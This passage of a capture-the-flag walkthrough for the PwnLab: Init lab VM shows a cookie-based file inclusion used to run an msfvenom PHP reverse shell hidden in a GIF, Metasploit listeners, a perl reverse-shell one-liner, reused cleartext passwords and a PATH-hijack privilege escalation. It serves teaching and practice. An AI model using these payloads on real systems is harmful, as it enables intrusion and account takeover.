+<div>We were able to successfully upload the file (it passed all the checks), but it wasn't executed as PHP code. That's not surprising. Unfortunately, I don't see any way to rename the file. I know the index.php page has a LFI issue, but I haven't actually looked at the source for that page yet. Let's see if we might could get it to execute our PHP code (inside our image upload).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# echo "PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4=" | base64 -d</div>
+    <div>&lt;?php</div>
+    <div>//Multilingual. Not implemented yet.</div>
+    <div>//setcookie("lang","en.lang.php");</div>
+    <div>if (isset($_COOKIE['lang']))</div>
+    <div>{</div>
+    <div>        <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">include("lang/".$_COOKIE['lang']);</font>
+    </div>
+    <div>}</div>
+    <div>// Not implemented yet.</div>
+    <div>?&gt;</div>
+    <div>&lt;html&gt;</div>
+    <div>&lt;head&gt;</div>
+    <div>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</div>
+    <div>&lt;/head&gt;</div>
+    <div>&lt;body&gt;</div>
+    <div>&lt;center&gt;</div>
+    <div>&lt;img src="images/pwnlab.png"&gt;&lt;br /&gt;</div>
+    <div>[ &lt;a href="/"&gt;Home&lt;/a&gt; ] [ &lt;a href="?page=login"&gt;Login&lt;/a&gt; ] [ &lt;a href="?page=upload"&gt;Upload&lt;/a&gt; ]</div>
+    <div>&lt;hr/&gt;&lt;br/&gt;</div>
+    <div>&lt;?php</div>
+    <div>        if (isset($_GET['page']))</div>
+    <div>        {</div>
+    <div>                include($_GET['page'].".php");</div>
+    <div>        }</div>
+    <div>        else</div>
+    <div>        {</div>
+    <div>                echo "Use this server to upload and share image files inside the intranet";</div>
+    <div>        }</div>
+    <div>?&gt;</div>
+    <div>&lt;/center&gt;</div>
+    <div>&lt;/body&gt;</div>
+    <div>&lt;/html&gt;</div>
+</div>
+<div><br /></div>
+<div>Interesting. In addition to the include that uses the 'page' variable (and appends .php), we have an include (that doesn't limit the file extension) loaded from a cookie. We should be able to use this to execute the code in our uploaded image file.</div>
+<div><br /></div>
+<div>Using curl, we are able to get phpinfo to load from our GIF file (using the "lang" cookie include)...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# curl -b "lang=../upload/daf280af792fd5b906511363ae2bc39d.gif" http://10.183.0.223/index.php</div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">GIF89a</font>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;
+    </div>
+    <div>&lt;html&gt;&lt;head&gt;</div>
+    <div>&lt;style type="text/css"&gt;</div>
+    <div>body {background-color: #fff; color: #222; font-family: sans-serif;}</div>
+    <div>pre {margin: 0; font-family: monospace;}</div>
+    <div>a:link {color: #009; text-decoration: none; background-color: #fff;}</div>
+    <div>a:hover {text-decoration: underline;}</div>
+    <div>table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}</div>
+    <div>.center {text-align: center;}</div>
+    <div>.center table {margin: 1em auto; text-align: left;}</div>
+    <div>.center th {text-align: center !important;} </div>
+    <div>td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}</div>
+    <div>h1 {font-size: 150%;}</div>
+    <div>h2 {font-size: 125%;}</div>
+    <div>.p {text-align: left;}</div>
+    <div>.e {background-color: #ccf; width: 300px; font-weight: bold;}</div>
+    <div>.h {background-color: #99c; font-weight: bold;}</div>
+    <div>.v {background-color: #ddd; max-width: 300px; overflow-x: auto;}</div>
+    <div>.v i {color: #999;}</div>
+    <div>img {float: right; border: 0;}</div>
+    <div>hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}</div>
+    <div>&lt;/style&gt;</div>
+    <div>&lt;title&gt;<font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">phpinfo()</font>&lt;/title&gt;&lt;meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /&gt;&lt;/head&gt;</div>
+    <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div>Notice how the output starts with our GIF image signature (GIF89a), then our PHP output. Now we just need to create a more malicious payload and get our reverse shell.</div>
+<div><br /></div>
+<div>We'll use msfvenom to create our PHP reverse shell (base64 encoded)...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5433 -e php/base64 -f raw &gt; rev64.php</div>
+    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
+    <div>[-] No arch selected, selecting arch: php from the payload</div>
+    <div>Found 1 compatible encoders</div>
+    <div>Attempting to encode payload with 1 iterations of php/base64</div>
+    <div>php/base64 succeeded with size 4089 (iteration=0)</div>
+    <div>php/base64 chosen with final size 4089</div>
+    <div>Payload size: 4089 bytes</div>
+</div>
+<div><br /></div>
+<div>Next, we'll create a new GIF image with the php reverse shell code.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# echo "474946383961" | xxd -r -p &gt; test2.gif                                                                      root@kali:~/Walkthroughs/pwnlabinit# cat rev64.php &gt;&gt; test2.gif</div>
+</div>
+<div><br /></div>
+<div class="note"><b>NOTE:</b> I wrapped the eval statement in the generated rev64.php file with &lt;?php ?&gt; tags.</div>
+<div><br /></div>
+<div>I'll upload test2.gif to the victim and obtain the uploaded image path from the displayed image (below the upload form). Then, I'll start my reverse shell listeners in Metasploit. I like to start two listeners so I can connect a second reverse shell from the PHP reverse shell (since the PHP reverse shell doesn't stay active for very long.)</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
+    <div>LPORT =&gt; 5433</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 0.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5433 </div>
+    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5434</div>
+    <div>LPORT =&gt; 5434</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 1.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5434</div>
+</div>
+<div><br /></div>
+<div>All that's left to do now is request index.php with our lang cookie pointing to our malicious GIF image...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/pwnlabinit# curl -b "lang=../upload/7ce98a7cf2e887f9caf3385c4b067063.gif" http://10.183.0.223/index.php</div>
+</div>
+<div><br /></div>
+<div>...which results in our session connecting in Metasploit...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5433 -&gt; 10.183.0.223:40939) at 2019-05-21 12:25:59 -0500</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
+    <div>[*] Starting interaction with 1...</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>pwd</div>
+    <div>/var/www/html</div>
+    <div>id</div>
+    <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+    <div>perl -e 'use Socket;$i="10.183.0.222";$p=5434;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Command shell session 2 opened (10.183.0.222:5434 -&gt; 10.183.0.223:49112) at 2019-05-21 12:26:09 -0500</div>
+    <div>background</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Background session 1? [y/N]  y</div>
+    <div>msf5 exploit(multi/handler) &gt; sessions 2</div>
+    <div>[*] Starting interaction with 2...</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>www-data@pwnlab:/var/www/html$</div>
+</div>
+<div><br /></div>
+<div>...I connected to the PHP reverse shell and kicked off a second reverse shell (using perl). Now we have a stable reverse shell on the victim.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Maintaining Access</h2>
+</div>
+<div><br /></div>
+<div>I skipped this step this time. Refer to my other write-ups for my typical "Maintaining Access" steps.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Privilege Escalation</h2>
+</div>
+<div><br /></div>
+<div>Checking the installed kernel and operating system...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@pwnlab:/$ uname -a</div>
+    <div>Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux</div>
+    <div>www-data@pwnlab:/$ cat /etc/os*</div>
+    <div>PRETTY_NAME="Debian GNU/Linux 8 (jessie)"</div>
+    <div>NAME="Debian GNU/Linux"</div>
+    <div>VERSION_ID="8"</div>
+    <div>VERSION="8 (jessie)"</div>
+    <div>ID=debian</div>
+    <div>HOME_URL="http://www.debian.org/"</div>
+    <div>SUPPORT_URL="http://www.debian.org/support"</div>
+    <div>BUG_REPORT_URL="https://bugs.debian.org/"</div>
+</div>
+<div><br /></div>
+<div>...against the exploit database... we don't actually have much to work with. </div>
+<div><br /></div>
+<div>Checking for SUID binaries, we have the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@pwnlab:/$ find / -user root -perm -u=s -type f 2&gt;&amp;1 | grep -v "Permission denied"</div>
+    <div>/bin/mount</div>
+    <div>/bin/su</div>
+    <div>/bin/umount</div>
+    <div>/sbin/mount.nfs<br /></div>
+    <div>/usr/bin/newgrp</div>
+    <div>/usr/bin/chfn</div>
+    <div>/usr/bin/passwd</div>
+    <div>/usr/bin/procmail</div>
+    <div>/usr/bin/chsh</div>
+    <div>/usr/bin/gpasswd</div>
+    <div>/usr/lib/eject/dmcrypt-get-device</div>
+    <div>/usr/lib/pt_chown</div>
+    <div>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</div>
+    <div>/usr/lib/openssh/ssh-keysign</div>
+    <div>/usr/sbin/exim4</div>
+</div>
+<div><br /></div>
+<div>The one that stands out is /usr/sbin/exim4.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@pwnlab:/$ /usr/sbin/exim4 --version</div>
+    <div>/usr/sbin/exim4 --version</div>
+    <div>Exim version 4.84_2 #2 built 13-Mar-2016 22:18:29</div>
+    <div>Copyright (c) University of Cambridge, 1995 - 2014</div>
+    <div>(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2014</div>
+    <div>Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)</div>
+    <div>Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM PRDR OCSP</div>
+    <div>Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd</div>
+    <div>Authenticators: cram_md5 plaintext</div>
+    <div>Routers: accept dnslookup ipliteral manualroute queryprogram redirect</div>
+    <div>Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp</div>
+    <div>Fixed never_users: 0</div>
+    <div>Size of off_t: 8</div>
+    <div>Configuration file is /var/lib/exim4/config.autogenerated</div>
+</div>
+<div><br /></div>
+<div>Checking the exploit database, we have a couple of potential hits.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Exim 4.84-3 - Local Privilege Escalation                                                                     | exploits/linux/local/39535.sh</div>
+    <div>Exim &lt; 4.86.2 - Local Privilege Escalation                                                                   | exploits/linux/local/39549.txt</div>
+</div>
+<div><br /></div>
+<div>Unfortunately, both these exploits require exim to be compiled with perl support, which ours isn't.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@pwnlab:/$ exim -bV -v | grep -i perl</div>
+</div>
+<div><br /></div>
+<div>We also have...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                | exploits/linux/local/40054.c</div>
+</div>
+<div><br /></div>
+<div>We can get it to compile on the victim, but we can't seem to get it to run (seg faults). Moving on...</div>
+<div><br /></div>
+<div>Checking /etc/passwd, we see that several of the users we harvested from the database have local accounts.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@pwnlab:/$ cat /etc/passwd</div>
+    <div>root:x:0:0:root:/root:/bin/bash</div>
+    <div>[...snip...]</div>
+    <div>john:x:1000:1000:,,,:/home/john:/bin/bash</div>
+    <div>kent:x:1001:1001:,,,:/home/kent:/bin/bash</div>
+    <div>mike:x:1002:1002:,,,:/home/mike:/bin/bash</div>
+    <div>kane:x:1003:1003:,,,:/home/kane:/bin/bash</div>
+    <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div>Let's see if the users' local account passwords are the same as the ones stored in the database.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@pwnlab:/etc/cron.daily$ su - kent</div>
+    <div>Password: JWzXuBJJNy</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>kent@pwnlab:~$ ls -laF</div>
+    <div>total 20</div>
+    <div>drwxr-x--- 2 kent kent 4096 Mar 17  2016 ./</div>
+    <div>drwxr-xr-x 6 root root 4096 Mar 17  2016 ../</div>
+    <div>-rw-r--r-- 1 kent kent  220 Mar 17  2016 .bash_logout</div>
+    <div>-rw-r--r-- 1 kent kent 3515 Mar 17  2016 .bashrc</div>
+    <div>-rw-r--r-- 1 kent kent  675 Mar 17  2016 .profile</div>
+    <div>kent@pwnlab:~$ exit</div>
+    <div>www-data@pwnlab:/$ su - mike</div>
+    <div>Password: SIfdsTEn6I</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>su: Authentication failure</div>
+    <div>www-data@pwnlab:/$ su - kane</div>
+    <div>Password: iSv5Ym2GRo</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>kane@pwnlab:~$ ls -laF</div>
+    <div>total 28</div>
+    <div>drwxr-x--- 2 kane kane 4096 Mar 17  2016 ./</div>
+    <div>drwxr-xr-x 6 root root 4096 Mar 17  2016 ../</div>
+    <div>-rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout</div>
+    <div>-rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc</div>
+    <div>-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike*</div>
+    <div>-rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile</div>
+    <div>kane@pwnlab:~$ file msgmike</div>
+    <div>file msgmike</div>
+    <div>msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped</div>
+</div>
+<div><br /></div>
+<div>The passwords for kent and kane worked, but not mike. Kent didn't have anything interesting in his home directory, but kane does. There is an ELF binary named msgmike. The binary also has the SUID bit set (with user/group mike), so it runs as mike. The only debugging tool we have available on the victim is "strings". Running that on the binary, we get the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>kane@pwnlab:~$ strings msgmike</div>
+    <div>[...snip...]</div>
+    <div>cat /home/mike/msg.txt</div>
+    <div>[...snip...]</div>
+</div>
+<div><br /></div>
+<div>Looks like the binary just cats a TXT file stored in mike's home folder. We'll go ahead and run it to see what the TXT file says.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>kane@pwnlab:~$ ./msgmike</div>
+    <div>cat: /home/mike/msg.txt: No such file or directory</div>
+</div>
+<div><br /></div>
+<div>Or not. Looks like the msg.txt file doesn't actually exist. All is not lost, however. The call to 'cat' doesn't specify the full path to the executable, so the program is looked up in $PATH. Since we control $PATH, we control the 'cat' command.</div>
+<div><br /></div>
+<div>To become mike, we will create our own version of cat that allows us to become mike. But first, we need to get mike's uid and gid.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>kane@pwnlab:~$ grep mike /etc/passwd</div>
+    <div>mike:x:1002:1002:,,,:/home/mike:/bin/bash</div>
+</div>
+<div><br /></div>
+<div>Now we'll create a C program to become mike (uid/gid 1002)...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>kane@pwnlab:~$ cat likemike.c</div>
+    <div>#include &lt;unistd.h&gt;</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>main( int argc, char ** argv, char ** envp )</div>
+    <div>{</div>
+    <div>    // setresuid, setresgid - set real, effective and saved user or group ID</div>
+    <div>    setresuid(1002, 1002, 1002);</div>
+    <div>    setresgid(1002, 1002, 1002);</div>
+    <div>    system("/bin/bash", argv, envp);</div>
+    <div>    return 0;</div>
+    <div>}</div>
+</div>
+<div><br /></div>
+<div>...compile it...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>kane@pwnlab:~$ gcc -o cat likemike.c</div>
+</div>
+<div><br /></div>
+<div>...update our PATH to include our $HOME directory as the first place to be searched...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>kane@pwnlab:~$ export PATH=$HOME:$PATH</div>
+</div>
+<div><br /></div>
+<div>...then run msgmike again.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>kane@pwnlab:~$ ./msgmike</div>
+    <div>mike@pwnlab:~$ id</div>
+    <div>uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)</div>
+</div>
+<div><br /></div>
+<div>And now we're mike! 😄 Hopefully that trouble will prove to be worth it.</div>
+<div><br /></div>
+<div>Let's go see what is in mike's home directory.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pwnlab:~$ cd /home/mike</div>
+    <div>mike@pwnlab:/home/mike$ ls -laF<br /></div>
+    <div>total 28<br /></div>
+    <div>drwxr-x--- 2 mike mike 4096 Mar 17  2016 ./</div>
+    <div>drwxr-xr-x 6 root root 4096 Mar 17  2016 ../</div>
+    <div>-rw-r--r-- 1 mike mike  220 Mar 17  2016 .bash_logout</div>
+    <div>-rw-r--r-- 1 mike mike 3515 Mar 17  2016 .bashrc</div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root*</font>
+    </div>
+    <div>-rw-r--r-- 1 mike mike  675 Mar 17  2016 .profile</div>
+</div>
+<div><br /></div>
+<div>Nice! We have a new SUID binary, this time for root. Let's run strings on it and try to see what this one does.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>mike@pwnlab:/home/mike$ strings msg2root</div>
+    <div>/lib/ld-linux.so.2</div>
+    <div>libc.so.6</div>
+    <div>_IO_stdin_used</div>
+    <div>stdin</div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">fgets</font>
+    </div>
+    <div>asprintf</div>
+    <div>system</div>
+    <div>__libc_start_main</div>
+    <div>__gmon_start__</div>
+    <div>GLIBC_2.0</div>
+    <div>PTRh</div>
+    <div>[^_]</div>
+    <div>Message for root:</div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">/bin/echo %s &gt;&gt; /root/messages.txt</font>
